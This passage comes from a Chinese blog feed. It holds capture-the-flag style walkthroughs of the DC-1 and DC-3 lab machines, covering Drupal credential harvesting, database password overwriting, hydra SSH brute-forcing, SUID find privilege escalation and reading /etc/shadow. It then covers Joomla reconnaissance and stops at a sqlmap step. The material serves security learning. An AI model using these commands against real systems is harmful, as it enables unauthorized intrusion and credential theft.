</p><p>比如，使用cat命令看看flag1.txt文件（上述执行ls获得的目录列表文件之一）的文件内容是什么：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911585897.png" alt="img"></p><p>继而搜索其他flag文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name flag*<br></code></pre></td></tr></table></figure><p>结果显示只有flag1.txt了捏：<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911600169.png" alt="img"></p><p>下一步要干什么呢？通过网路查询Drupal CMS的配置文件一般叫什么，以它为切入口。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911651067.png" alt="img"></p><p>经过查询得知，Drupal的配置文件一般叫settings.php，因而找出所有<code>*settings.php</code>文件出来。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *settings.php<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911693543.png" alt="img"></p><p>一共找到了三个捏。根据文件名，第一个文件大概率是主题相关的，可以先查看后面两个文件。</p><blockquote><p>&#x2F;var&#x2F;www&#x2F;themes&#x2F;garland&#x2F;theme-settings.php<br>&#x2F;var&#x2F;www&#x2F;sites&#x2F;default&#x2F;settings.php<br>&#x2F;var&#x2F;www&#x2F;sites&#x2F;default&#x2F;default.settings.php</p></blockquote><p>先查看第二个文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/www/sites/default/settings.php<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911742361.png" alt="img"></p><p>直接就得到了数据库的相关信息，包括用户名和密码等。与此同时也得到了flag2的相关提示信息。</p><p>继续查看第三个文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/www/sites/default/default.settings.php<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911885892.png" alt="img"></p><p>多为注释，没啥实质性有用的信息。</p><p>根据第二个文件获取到的数据库相关信息，尝试登陆数据库，查看其中的数据。并尝试获取登陆的<code>用户名</code>和<code>密码</code>：</p><p>- </p><p>使用MYSQL命令之前需要先确保它的服务已经开启，并且已经启动。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl status mysql    // 检查状态<br>systemctl start mysql     // 启动服务<br></code></pre></td></tr></table></figure><p>未开启服务的时候返回的响应信息如果指向的是MariaDB服务未启动。</p><p>使用命令设置MariaDB自启动：（系统下次启动时就会自动启动它）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo systemctl <span class="hljs-built_in">enable</span> mariadb<br></code></pre></td></tr></table></figure><p>- </p><p>尝试执行数据库登陆命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql -udbuser -pR0ck3t<br></code></pre></td></tr></table></figure><p>用户名是<code>dbuser</code></p><p>密码是<code>R0ck3t</code></p><p>返回响应信息如下，表示成功登陆了数据库：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911929825.png" alt="img"></p><p>查看数据库的内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">show databases;<br>（分号是必须要加的）<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912100696.png" alt="img"></p><p>有两个数据库，一个是记录当前数据库系统中所有元数据的记录文件，另一个是drupaldb数据库。</p><p>接下来查看数据库中的表名：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use drupaldb;<br><br>show tables;<br><br></code></pre></td></tr></table></figure><p>注意，分号也是需要的哦。</p><p>得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912152617.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912172891.png" alt="img"></p><p>根据表名，我们可以发现数据库中含有一个表名为<code>user</code>的表，里面应该会有一些信息。</p><p>接下来查看该表的内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span>;<br></code></pre></td></tr></table></figure><p>得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912205136.png" alt="img"></p><p>其中的name应该表示的是用户名，pass表示的是对应的密码。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912238522.png" alt="img"></p><p>但是细看pass，都是经过加密保护的数据：</p><blockquote><p>数据库中的密码一般采用的是hash加密。因此关于数据库加密密码的破解可以通过一些hash加密脚本进行切入。</p></blockquote><p>输入命令：（需要先退出，切换为交互界面哦~）</p><p>退出后的切换命令：<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *<span class="hljs-built_in">hash</span>*<br></code></pre></td></tr></table></figure><p>查询得到的结果很多：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912450355.png" alt="img"></p><p>通过查看文件命名，可以发现存在一个名为：<code>password-hash.sh</code>的文件，初步判断其应该是我们要找的hash加密脚本。读取该脚本寻找其使用方法。</p><blockquote><p>.sh后缀的文件一般是shell脚本文件。用于在linux系统中执行一些自动化任务或者命令序列。</p></blockquote><p>读取加密脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/www/scripts/password-hash.sh<br></code></pre></td></tr></table></figure><p>得到结果（一些关键信息如下）：</p><p>比如，使用说明和帮助信息：支持‘–root’选项，用于将工作目录切换到drupal安装目录。所有的明文密码都必须使用双引号括起来。</p><p>“ One or more plan-text passwords enclosed by double quotes.”</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912499494.png" alt="img"></p><p>得知这个信息之后，我们可以利用这个加密脚本中的加密方法构造一个已知用户名对应的对我们而言已知的新密码。进而替换users表格中的对象。</p><p>修改目标：将用户名为admin的密码修改为’admin‘</p><p>运行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php /var/www/scripts/password-hash.sh admin<br></code></pre></td></tr></table></figure><p>注：该条命令的意思是，运行该.sh脚本，生成明文密码是“admin”的hash加密密码值。</p><p><strong>plain-pass</strong>：admin</p><p><strong>encrypt-hash-pass：</strong></p><p>$S$DwaP8RG77fiZwwCdr0LjW4BhdYIczowL4XnwXBg47LvTossBwdji</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912714433.png" alt="img"></p><p>接下来就是回到数据库中将用户名为“admin”的密码改为我们新生成的hash密码值，即修改admin用户的密码为’admin‘。</p><p>mysql -udbuser -pR0ck3t</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">use drupaldb;<br>update <span class="hljs-built_in">users</span> <span class="hljs-built_in">set</span> pass=<span class="hljs-string">&quot;$S<span class="hljs-variable">$DwaP8RG77fiZwwCdr0LjW4BhdYIczowL4XnwXBg47LvTossBwdji</span>&quot;</span> <span class="hljs-built_in">where</span> name=<span class="hljs-string">&quot;admin&quot;</span> or name=<span class="hljs-string">&quot;Fred&quot;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912949408.png" alt="img"></p><p>验证是否成功修改，<code>select * from users；</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913292131.png" alt="img"></p><p>- </p><p>退出mysql命令行使用<code>exit</code><br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913312573.png" alt="img"></p><p>- </p><p>使用”name：admin，pass：admin“去登陆目标ip网页。得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913355053.png" alt="img"></p><p>然后我们选择上方的”content“点击，查看其内容：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913389424.png" alt="img"></p><p>发现有个”flag3“，点击，得到如下效果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913374497.png" alt="img"></p><p>访问文件<code>/etc/passwd</code>获取相关系统用户信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913409356.png" alt="img"></p><p>解释：&#x2F;etc&#x2F;passwd文件中的每条信息包含了多个字段，各个字段之间使用冒号分隔开来。</p><blockquote><p>显示字段的语法：</p><p>用户名：密码占位符（通常是’x‘）：用户ID（UID）：组ID（GID）：用户描述：家目录：登陆shell</p></blockquote><p>接下来尝试访问<code>/etc/shadow</code>文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/shadow<br></code></pre></td></tr></table></figure><p>由结果发现，由于权限不足，文件访问遭到拒绝：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240619125252692.png" alt="image-20240619125252692"></p><p>解释：&#x2F;etc&#x2F;shadow文件一般用于存储系统用户的加密密码及其相关的安全设置，通常只有系统管理员可以访问。</p><blockquote><p>显示字段的语法：（各字段使用冒号分隔）</p><p>用户名：加密密码：上次密码更改日期：密码更改最短间隔：密码更改最长间隔：密码过期警告天数：账户失效日期：保留字段</p><p>其中，加密密码通常使用的是’bcrypt’’SHA-256’或’SHA-512’等强哈希算法加密。</p></blockquote><p>回看上述获取的系统用户信息，发现近开头处有一个名为<code>root</code>的用户（doge&#x2F;），尝试使用字典爆破，看看能不能直接同时拿到登陆数据和提权。</p><p>切换回kali的root用户，使用hydra进行密码字典爆破：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.204.129<br></code></pre></td></tr></table></figure><p>实际上，爆破的时间很长，而且，好像看不到结果（如下），所以想通过直接爆破root来获取登陆数据和实现提权是不大现实的。<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913636136.png" alt="img"></p><p>再看！近末尾处存在一个用户名为<code>flag4</code>的用户（为什么选中它就是！因为flag这个单词很熟，而且通常包含了关键信息）。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913619371.png" alt="img"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l flag4 -P /usr/share/wordlists/rockyou.txt ssh://192.168.204.129<br></code></pre></td></tr></table></figure><p>很快地，就爆破出了这个用户的ssh登陆密码：</p><blockquote><p>flag4</p><p>orange</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913790835.png" alt="img"></p><blockquote><p>hydra（密码破解工具）使用语法：</p><p>hydra -l 单个用户名 -p 密码字典表 -e 超时重试次数 -t count -M file -T count1 -o outputfile -f pass1 -c t1 -w t2 -C t3 -R t4 -s 指定端口号 -x    -SuvVd46 其它选项 服务:&#x2F;&#x2F;服务：端口</p></blockquote><p>- </p><p><code>[-l LOGIN|-L FILE]</code>：指定单个用户名 <code>-l</code> 或从文件中读取用户名列表 <code>-L</code>。</p><p><code>[-p PASS|-P FILE]</code>：指定单个密码 <code>-p</code> 或从文件中读取密码列表 <code>-P</code>。</p><p><code>[-e ns]</code>：设置错误和超时的重试次数，默认为 5 次错误和 20 秒的超时。</p><p><code>[-t TASKS]</code>：同时运行的任务数，默认为 16。</p><p><code>[-M FILE]</code>：启用并行模式，从文件中读取主机列表。</p><p><code>[-T TASKS]</code>：每个主机并行任务数，默认为 16。</p><p><code>[-o FILE]</code>：将结果输出到文件。</p><p><code>[-f]</code>：强制使用指定的密码，即使它不工作。</p><p><code>[-c TIME]</code>：等待连接超时时间，默认为 30 秒。</p><p><code>[-w TIME]</code>：等待响应超时时间，默认为 30 秒。</p><p><code>[-C TIME]</code>：每个连接的间隔时间，默认为 0 秒。</p><p><code>[-R TIME]</code>：等待任务切换时间，默认为 0 秒。</p><p><code>[-s PORT]</code>：连接到指定端口，默认为服务的标准端口。</p><p><code>[-x MIN:MAX:CHARSET]</code>：使用指定的字符集生成密码。</p><p><code>[-SuvVd46]</code>：其他选项，例如静默模式 <code>-S</code>、详细输出 <code>-v</code>、非详细输出 <code>-V</code>、调试输出 <code>-d</code>、IPv6 支持 <code>-6</code> 等。</p><p><code>[service://server[:PORT][/OPT]]</code>：指定目标服务的协议、服务器地址和端口，以及可选的参数。</p><p>- </p><p>ok！登陆权限拿到！</p><p>返回靶机尝试登陆，发现能够成功以flag4用户的身份登陆。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913908123.png" alt="img"></p><h3 id="2、提权"><a href="#2、提权" class="headerlink" title="2、提权"></a>2、提权</h3><p>接下来进行提权，以获得更多有用的信息。</p><p>首先先使用<code>find</code>命令，查找具有SUID权限（拥有者&#x2F;管理者权限）的可执行二进制文件（通俗点理解就是命令，比如find这种）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>查找结果如下：</p><p>由查找结果可以发现，find命令也具有SUID权限，因而可以通过它实现提权。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913930750.png" alt="img"></p><p>输入命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name index.php -<span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;/bin/sh&quot;</span> \;<br></code></pre></td></tr></table></figure><p>解释：命令意思是，使用find命令，通过执行 “&#x2F;bin&#x2F;sh”文件来查找名为index.php的文件。其中，查找什么文件不重要，关键是使用具有<code>SUID权限</code>的命令去调用执行<code>-exec &quot;/bin/sh&quot;</code>。</p><p>（注意末尾的符号也需要！而且需要有个空格！！！）</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913967593.png" alt="img"></p><blockquote><p>&#x2F;bin&#x2F;sh文件：<br>是系统默认的命令行解释器，通常被称为’shell‘</p></blockquote><p>成功提权！此时也可以访问<code>/etc/shadow</code>（密码）文件了。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913992790.png" alt="img"></p><p>结束。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>DC1靶场攻打过程中使用到的相关关键操作技术：、</p><ul><li><p>首先先进行信息收集。使用<code>nmap</code>端口扫描收集开放端口信息。通过端口信息试图获取目标靶场的相关信息，比如所使用的框架等。</p></li><li><p>利用<code>msfconsole</code>寻找有关drupal CMS框架的漏洞，并利用漏洞重置<code>RHOSTS</code>字段值为目标靶机值，使用<code>run/exploit</code>命令执行。</p></li><li><p>获取shell，同样是通过<code>msfconsole</code>实现，输入<code>shell  -&gt;  ls</code>看是否成功列出目录文件，成功则表示get shell成功。输入命令<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code>开启用户交互界面（即以靶机用户身份进行后续操作）</p></li><li><p>搜索靶机框架的配置文件名，搜索其下的所有相关配置文件，并<code>cat</code>查看文件内容，试图从中获取有用的信息。</p></li><li><p>获取数据库内容之后，使用命令<code>mysql -uName -pPassword</code>尝试登陆。</p></li><li><p>使用hydra进行密码爆破</p></li><li><p>提权，首先需要查找有SUID权限的命令，<code>find / -perm -u=s -type f 2&gt;/dev/null</code>，然后执行<code>（SUID） / -name index.php -exec &quot;/bin/sh&quot; \;</code>进行提权。</p></li><li><p>检测权限属主的命令为<code>whoami和id</code></p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DC-3</title>
    <link href="/2024/07/24/DC-3/"/>
    <url>/2024/07/24/DC-3/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h1><h2 id="IP扫描"><a href="#IP扫描" class="headerlink" title="IP扫描"></a>IP扫描</h2><p>首先，必须先确定测试机器（kali）和目标靶机处于同一个模式（这里使用NAT模式）。否则在kali端扫不出目标靶机的IP地址。</p><p>- </p><p>此外，在本次在虚拟机打开靶机的过程中，遇到了一个问题：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240701215940440.png" alt="image-20240701215940440"></p><p>解决方法（亲测有用）：将CD&#x2F;DVD（IDE）选项的<code>IDE（D）</code>修改为<code>IDE 0：0</code>。</p><p><a href="https://developer.aliyun.com/article/1209515">https://developer.aliyun.com/article/1209515</a></p><p>- </p><p>然后通过开关靶机以及进行nmap网段扫描来确定靶机的IP地址。</p><p>开靶机前：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240701222633001.png" alt="image-20240701222633001"></p><p>开靶机后：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240701222702232.png" alt="image-20240701222702232"></p><p>通过前后nmap扫描结果的对比，可以确认目标靶机的IP地址是：<code>192.168.204.132</code></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><h3 id="开放端口扫描"><a href="#开放端口扫描" class="headerlink" title="开放端口扫描"></a>开放端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN -p- 192.168.204.132<br>nmap -sT -p- 192.168.204.132<br></code></pre></td></tr></table></figure><p>扫描结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240701224802419.png" alt="image-20240701224802419"></p><p>由检测结果可以看出，目标靶机开放的端口服务只有<code>80</code>端口（http协议）。接下来进行更加详细的端口扫描。</p><h3 id="详细端口扫描"><a href="#详细端口扫描" class="headerlink" title="详细端口扫描"></a>详细端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sV -sC -O -p 80 192.168.204.132<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240701230223132.png" alt="image-20240701230223132"></p><p>可以看到，其开放的80端口服务有http网页相关内容的信息。但除此之外没有其它有用的信息了。所以我们可以再进行nmap漏扫，尝试获取更多有价值的信息。</p><h3 id="nmap漏扫"><a href="#nmap漏扫" class="headerlink" title="nmap漏扫"></a>nmap漏扫</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -script=vuln -p 80 192.168.204.132<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702110519853.png" alt="image-20240702110519853"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702110540612.png" alt="image-20240702110540612"></p><p>发现可能这个目标靶机网页可能存在着：</p><p><code>Joomla 中的SQL注入漏洞</code>：(SQL Injection Vulnerability)</p><blockquote><p> An SQL injection vulnerability in Joomla! 3.7.x before 3.7.1 allows attackers to execute aribitrary SQL commands via unspecified vectors.</p><p> 在Joomla中存在一个SQL注入漏洞，3.7版本在3.7.1之前它允许攻击者使用未指明的变量去执行任意SQL命令。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702111339383.png" alt="image-20240702111339383"></p><p><code>DOS攻击漏洞</code>：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702111629174.png" alt="image-20240702111629174"></p><p><code>csrf漏洞</code>：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702110758621.png" alt="image-20240702110758621"></p><p>扫描结果列举了可能存在csrf漏洞的目录：</p><blockquote><p>&#x2F;index.php</p><p>&#x2F;index.php&#x2F;component&#x2F;users&#x2F;?task&#x3D;remind.remind&amp;Itemid&#x3D;101</p><p>&#x2F;index.php&#x2F;component&#x2F;users&#x2F;?Itemid&#x3D;101</p><p>&#x2F;index.php&#x2F;component&#x2F;users&#x2F;?task&#x3D;reset.request&amp;Itemid&#x3D;101</p></blockquote><table><thead><tr><th align="left">csrf漏洞：CSRF (Cross-site request forgery，跨站请求伪造)也被称为One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本(XSS)，但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户请求受信任的网站。简单的说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己以前认证过的站点并运行一些操作（如发邮件，发消息，甚至财产操作（如转账和购买商品））。因为浏览器之前认证过，所以被访问的站点会觉得这是真正的用户操作而去运行。</th></tr></thead></table><h2 id="网页信息收集"><a href="#网页信息收集" class="headerlink" title="网页信息收集"></a>网页信息收集</h2><h3 id="访问目标靶机"><a href="#访问目标靶机" class="headerlink" title="访问目标靶机"></a>访问目标靶机</h3><p>在浏览器访问目标靶机的IP地址<code>192.168.204.132</code></p><p>得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702104858844.png" alt="image-20240702104858844"></p><p>其中的提示信息为：</p><blockquote><p>This time, there is only one flag, one entry point and no clues.</p><p>To get the flag, you’ll obviously have to gain root privileges.</p><p>How you get to be root is up to you - and, obviously, the system.</p><p>Good luck - and I hope you enjoy this little challenge.</p><p>这次只有一个flag，一个入口并且没有提示。为了获取flag，你需要获得root权限。如何获得root权限取决于你自己，当然，也取决于系统。祝你好运，我希望你能享受这个挑战。</p></blockquote><h3 id="指纹工具识别技术构成"><a href="#指纹工具识别技术构成" class="headerlink" title="指纹工具识别技术构成"></a>指纹工具识别技术构成</h3><p>使用浏览器插件<code>Wappalyzer</code>进行指纹识别，进行网页技术构成识别。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702113249330.png" alt="image-20240702113249330"></p><p>可以看到，这个网页使用的是<strong>Joomla CMS</strong>框架，Joomia在前面进行nmap漏扫的时候也出现过捏！使用的编程语言是<strong>PHP</strong>，操作系统是<strong>Ubuntu</strong>。</p><h2 id="gubuster目录爆破"><a href="#gubuster目录爆破" class="headerlink" title="gubuster目录爆破"></a>gubuster目录爆破</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.204.132 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure><p>得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702184616071.png" alt="image-20240702184616071"></p><p>得到的目录信息：</p><blockquote><p> <a href="http://192.168.204.132/media/">http://192.168.204.132/media/</a></p><p> <a href="http://192.168.204.132/templates/">http://192.168.204.132/templates/</a></p><p> <a href="http://192.168.204.132/modules/">http://192.168.204.132/modules/</a></p><p> <a href="http://192.168.204.132/images/">http://192.168.204.132/images/</a></p><p> <a href="http://192.168.204.132/bin/">http://192.168.204.132/bin/</a></p><p> <a href="http://192.168.204.132/plugins/">http://192.168.204.132/plugins/</a></p><p> <a href="http://192.168.204.132/includes/">http://192.168.204.132/includes/</a></p><p> <a href="http://192.168.204.132/language/">http://192.168.204.132/language/</a></p><p> <a href="http://192.168.204.132/components/">http://192.168.204.132/components/</a></p><p> <a href="http://192.168.204.132/cache/">http://192.168.204.132/cache/</a></p><p> <a href="http://192.168.204.132/libraries/">http://192.168.204.132/libraries/</a></p><p> <a href="http://192.168.204.132/tmp/">http://192.168.204.132/tmp/</a></p><p> <a href="http://192.168.204.132/layouts/">http://192.168.204.132/layouts/</a></p><p> <a href="http://192.168.204.132/administrator/">http://192.168.204.132/administrator/</a></p><p> <a href="http://192.168.204.132/cli/">http://192.168.204.132/cli/</a></p></blockquote><p>发现了管理员目录，即后台管理系统 <code>http://192.168.204.132/administrator/</code>欸！！</p><p>试着在网页进行访问：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702185113830.png" alt="image-20240702185113830"></p><p>接下来的思路是寻找可通过认证的用户账号，即用户名和密码。</p><h2 id="漏洞搜索"><a href="#漏洞搜索" class="headerlink" title="漏洞搜索"></a>漏洞搜索</h2><h3 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h3><p>使用<code>searchsploit</code>进行漏洞搜索。</p><p>- </p><p>在前面两个靶场中，我们都是使用kali自带的msfconsole来进行漏洞查询，那为什么在这个靶场就要使用searchsploit了呢？searchsploit和msfconsole有什么区别？</p><blockquote><ul><li><p>searchsploit</p><p>功能：用于搜索漏洞利用代码，是一个命令行工具。</p><p>用途：主要用于查找已知漏洞的利用代码。</p></li><li><p>msfconsole</p><p>功能：是metasploit框架的命令行接口，包含了大量的漏洞利用模块。</p><p>用途：主要用于执行漏洞渗透测试活动，包括选择合适的漏洞利用模块，设置payload，执行渗透攻击，获取远程访问权限等。</p></li></ul></blockquote><p>- </p><p>前面 nmap漏扫 以及 后面的 gubuster目录爆破的后台管理界面 已经提示得不能再明显了，是Joomla！所以此处我们直接针对这个漏洞使用searchsploit。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit Joomla<br></code></pre></td></tr></table></figure><p>找到非常多该漏洞的可利用代码文件：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702191749731.png" alt="image-20240702191749731"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702191823709.png" alt="image-20240702191823709"></p><p>根据前面进行nmap漏扫得到的结果显示，目标靶机使用的Joomla版本为3.7.0。因此，我们可以进行更详细的searchsploit搜索。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit Joomla 3.7.0<br></code></pre></td></tr></table></figure><p>得到的结果很精炼，可以利用SQL注入以及CSS攻击：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702192127253.png" alt="image-20240702192127253"></p><p>查看其详细信息：</p><p>如何查看<code>php/webapps/42033.txt</code>以及<code>php/webapps/43488.txt</code>代码文件？</p><p>答：使用searchsploit。使用<code>searchsploit -p 42033/43488.txt </code> 命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit -p 42033.txt<br>searchsploit -p 43488.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702193128571.png" alt="image-20240702193128571"></p><p>在详细信息中，可利用代码文件的路径path被展示出来。</p><ul><li>SQL注入</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span>  /usr/share/exploitdb/exploits/php/webapps/42033.txt   <br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702193539768.png" alt="image-20240702193539768"></p><p>可以从中得到该SQL注入漏洞利用的使用方法，利用sqlmap：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span 